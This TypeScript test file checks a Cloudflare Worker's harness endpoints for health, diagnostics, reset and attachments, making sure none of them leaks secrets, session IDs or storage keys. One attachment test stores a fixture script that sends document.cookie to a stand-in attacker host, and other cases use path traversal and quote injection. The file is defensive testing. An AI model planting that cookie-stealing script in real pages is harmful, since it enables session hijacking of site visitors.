// The deterministic control plane. These endpoints exist in every deployment
// regardless of contract, and none of them may reveal a secret, a storage key,
// or another session's data.
import { env } from "cloudflare:test";
import { describe, expect, it } from "vitest";
import {
  handleHarnessAttachment,
  handleHarnessDiagnostics,
  handleHarnessHealth,
  handleHarnessReset,
  handleSimulatedRequest,
} from "../src/kernel/handle";
import { deriveStorageNamespace } from "../src/kernel/session";
import { LIMITS } from "../src/kernel/limits";
import { countingEnv, final, mockGroq, readSite, sessionIdFromCookie, siteRequest, storedStateJson } from "./helpers";
import type { CountedEnv } from "./helpers";

async function session(testEnv: CountedEnv, state: unknown = { seeded: true }): Promise<string> {
  const result = await readSite(
    await handleSimulatedRequest(siteRequest({ path: "/" }), testEnv, { inference: mockGroq([final({ state })]) }),
  );
  return result.sessionCookie!;
}

const control = (path: string, cookie?: string | null, method = "GET") =>
  new Request(`https://example.test/__harness/${path}`, {
    method,
    headers: cookie ? { cookie } : {},
  });

describe("health", () => {
  it("reports the runtime's readiness without exposing anything", async () => {
    const response = await handleHarnessHealth(countingEnv());
    const body = (await response.json()) as Record<string, unknown>;

    expect(body.ok).toBe(true);
    expect(body.state_store).toBe("ok");
    expect(body.provider_secret).toBe("configured");
    expect(body.filesystem_binding).toBe("bound");
    expect(response.headers.get("cache-control")).toBe("no-store");

    // Key material, prompts and storage identifiers must never appear.
    const serialized = JSON.stringify(body);
    for (const leak of ["gsk_", "sk-or-", "AIza", "test-key", "test-salt", "sessions/", "constitution"]) {
      expect(serialized, leak).not.toContain(leak);
    }
  });

  it("says which providers are configured, by name only", async () => {
    const body = (await (await handleHarnessHealth(countingEnv())).json()) as {
      providers: { name: string; configured: boolean }[];
    };
    expect(body.providers.map((p) => p.name)).toContain("groq");
    for (const provider of body.providers) {
      expect(Object.keys(provider).sort()).toEqual(["configured", "name"]);
    }
  });

  it("admits when the state store is unreachable instead of claiming health", async () => {
    const broken = countingEnv({
      STATE_DB: {
        prepare() {
          throw new Error("simulated outage");
        },
      } as unknown as D1Database,
    });
    const body = (await (await handleHarnessHealth(broken)).json()) as Record<string, unknown>;
    expect(body.ok).toBe(false);
    expect(body.state_store).toBe("unavailable");
  });

  it("admits when no provider secret is present", async () => {
    const bare = countingEnv({ GROQ_API_KEY: "", GEMINI_API_KEY: undefined, OPENROUTER_API_KEY: undefined });
    const body = (await (await handleHarnessHealth(bare)).json()) as Record<string, unknown>;
    expect(body.ok).toBe(false);
    expect(body.provider_secret).toBe("missing");
  });
});

describe("diagnostics", () => {
  it("answers safely when there is no session", async () => {
    const body = (await (await handleHarnessDiagnostics(control("diagnostics"), countingEnv())).json()) as Record<string, unknown>;
    expect(body).toEqual({ ok: true, session: "absent" });
  });

  it("reports sizes and versions but never the document itself", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv, { secret: "do-not-reveal-this", things: [1, 2, 3] });

    const body = (await (await handleHarnessDiagnostics(control("diagnostics", cookie), testEnv)).json()) as Record<string, unknown>;
    expect(body.session).toBe("present");
    expect(body.state_version).toBe(1);
    expect(body.state_bytes).toBeGreaterThan(0);
    expect(body.state_limit_bytes).toBe(LIMITS.stateBytes);

    const serialized = JSON.stringify(body);
    expect(serialized).not.toContain("do-not-reveal-this");
    expect(serialized).not.toContain("things");
    expect(serialized).not.toContain(sessionIdFromCookie(cookie));
  });
});

describe("reset", () => {
  it("does nothing gracefully when there is no session", async () => {
    const response = await handleHarnessReset(control("reset", null, "POST"), countingEnv());
    expect(response.status).toBe(200);
    expect(await response.text()).toContain("nothing to reset");
  });

  it("clears the document, wipes the objects and expires the cookie", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv, { things: ["kettle"] });
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/export.csv`, "a,b", { httpMetadata: { contentType: "text/csv" } });

    const response = await handleHarnessReset(control("reset", cookie, "POST"), testEnv);

    // The visitor is sent back to a site that no longer remembers them.
    expect(response.status).toBe(303);
    expect(response.headers.get("location")).toBe("/");
    expect(response.headers.get("set-cookie")).toContain("Max-Age=0");
    expect(response.headers.get("x-las-reset")).toContain("files_deleted=1");
    expect(await storedStateJson(sessionIdFromCookie(cookie))).toBe("null");
    expect(await env.VFS_BUCKET.head(`${namespace}/export.csv`)).toBeNull();
  });

  it("can leave stored objects alone when asked", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/keep.txt`, "keep", { httpMetadata: { contentType: "text/plain" } });

    const response = await handleHarnessReset(
      new Request("https://example.test/__harness/reset?files=0", { method: "POST", headers: { cookie } }),
      testEnv,
    );
    expect(response.headers.get("x-las-reset")).toContain("files_deleted=0");
    expect(await env.VFS_BUCKET.head(`${namespace}/keep.txt`)).not.toBeNull();
    expect(await storedStateJson(sessionIdFromCookie(cookie))).toBe("null");
  });

  it("cannot reset a session other than the caller's own", async () => {
    const testEnv = countingEnv();
    const victim = await session(testEnv, { keep: "this" });
    const attacker = await session(testEnv, { other: true });

    await handleHarnessReset(control("reset", attacker, "POST"), testEnv);
    // The victim's document is untouched: reset is scoped by the cookie alone.
    expect(await storedStateJson(sessionIdFromCookie(victim))).toContain("keep");
  });
});

describe("attachment delivery", () => {
  const attachment = (path: string, cookie: string | null) =>
    new Request(`https://example.test/__harness/attachment?path=${encodeURIComponent(path)}`, {
      headers: cookie ? { cookie } : {},
    });

  it("serves an inert file with its own type", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/exports/data.csv`, "a,b\n1,2\n", { httpMetadata: { contentType: "text/csv" } });

    const response = await handleHarnessAttachment(attachment("/exports/data.csv", cookie), testEnv);
    expect(response.status).toBe(200);
    expect(await response.text()).toBe("a,b\n1,2\n");
    expect(response.headers.get("content-type")).toBe("text/csv");
    expect(response.headers.get("content-disposition")).toBe('attachment; filename="data.csv"');
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
    expect(response.headers.get("content-security-policy")).toContain("default-src 'none'");
  });

  it("downgrades active content to opaque bytes", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    const hostile = '<script>fetch("https://attacker.test/?c="+document.cookie)</script>';
    await env.VFS_BUCKET.put(`${namespace}/page.html`, hostile, { httpMetadata: { contentType: "text/html" } });

    const response = await handleHarnessAttachment(attachment("/page.html", cookie), testEnv);
    // Bytes are preserved exactly, but nothing will ever render them.
    expect(await response.text()).toBe(hostile);
    expect(response.headers.get("content-type")).toBe("application/octet-stream");
    expect(response.headers.get("content-disposition")).toContain("attachment");
  });

  it("is a plain 404 for anything it will not serve", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/private.txt`, "mine", { httpMetadata: { contentType: "text/plain" } });

    // No session, another session, traversal, a reserved prefix, and absent files
    // are all indistinguishable from the outside.
    const other = await session(testEnv);
    const cases: [string, string | null][] = [
      ["/private.txt", null],
      ["/private.txt", other],
      ["/../private.txt", cookie],
      ["/__harness/attachment", cookie],
      ["/absent.txt", cookie],
      ["relative.txt", cookie],
    ];
    for (const [path, jar] of cases) {
      const response = await handleHarnessAttachment(attachment(path, jar), testEnv);
      expect(response.status, `${path} ${jar ? "with cookie" : "anonymous"}`).toBe(404);
      const body = await response.text();
      expect(body).not.toContain("mine");
      expect(body).not.toContain("sessions/");
    }

    // Missing the parameter entirely is also just a 404.
    expect(
      (await handleHarnessAttachment(new Request("https://example.test/__harness/attachment", { headers: { cookie } }), testEnv)).status,
    ).toBe(404);
  });

  it("never puts a storage key or session id in the response", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const id = sessionIdFromCookie(cookie);
    const namespace = await deriveStorageNamespace(id, "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/a.txt`, "x", { httpMetadata: { contentType: "text/plain" } });

    const response = await handleHarnessAttachment(attachment("/a.txt", cookie), testEnv);
    const headers = JSON.stringify([...response.headers]);
    expect(headers).not.toContain(namespace);
    expect(headers).not.toContain(id);
    expect(headers).not.toContain("test-salt");
  });

  it("strips quoting from the filename it echoes back", async () => {
    const testEnv = countingEnv();
    const cookie = await session(testEnv);
    const namespace = await deriveStorageNamespace(sessionIdFromCookie(cookie), "test-salt");
    await env.VFS_BUCKET.put(`${namespace}/od"d.txt`, "x", { httpMetadata: { contentType: "text/plain" } });

    const response = await handleHarnessAttachment(attachment('/od"d.txt', cookie), testEnv);
    const disposition = response.headers.get("content-disposition") ?? "";
    // A quote in the name must not be able to end the header's quoted string.
    expect(disposition.match(/"/g)?.length).toBe(2);
  });
});
